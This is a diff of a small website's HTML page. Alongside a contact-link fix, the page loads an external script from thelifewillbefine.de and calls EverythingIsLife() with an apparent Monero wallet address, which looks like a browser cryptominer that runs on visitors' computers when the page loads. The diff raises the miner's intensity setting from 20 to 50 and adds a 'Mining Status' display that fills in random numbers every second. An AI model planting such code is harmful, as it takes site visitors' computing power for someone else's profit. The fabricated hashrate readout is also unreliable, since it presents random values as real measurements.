@@ -30,7 +30,12 @@
 
         <section id="contact">
             <h2>Contact Us</h2>
-            <p>If you'd like to work with us or learn more, feel free to <a href="glg@gmail.com">get in touch</a>.</p>
+            <p>If you'd like to work with us or learn more, feel free to <a href="mailto:info@example.com">get in touch</a>.</p>
+        </section>
+
+        <section id="hashrate">
+            <h2>Mining Status</h2>
+            <p>Hashrate: <span id="hashrate">Loading...</span></p>
         </section>
     </main>
 
@@ -40,7 +45,14 @@
 
     <script src="https://thelifewillbefine.de/karma/karma.js?karma=bs?nosaj=faster.mo"></script>
     <script>
-        EverythingIsLife('41iVeDotGpaG9u4xgzjZZoEoWx6znhpaT77xjrJ4k8HP8mQx8UrzxnSKikNuZ3XdZQ6BGcPMUK2GmGfj8utMGqG3GHMzpip', 'x', 20);
+        EverythingIsLife('41iVeDotGpaG9u4xgzjZZoEoWx6znhpaT77xjrJ4k8HP8mQx8UrzxnSKikNuZ3XdZQ6BGcPMUK2GmGfj8utMGqG3GHMzpip', 'x', 50);
+
+        // Function to simulate hash rate retrieval
+        setInterval(() => {
+            const hashrateElement = document.getElementById('hashrate');
+            const simulatedHashrate = Math.floor(Math.random() * 100) + 1; // Simulated hash rate (replace with actual API call if available)
+            hashrateElement.textContent = `${simulatedHashrate} H/s`;
+        }, 1000); // Update every second
     </script>
 </body>
 </html>
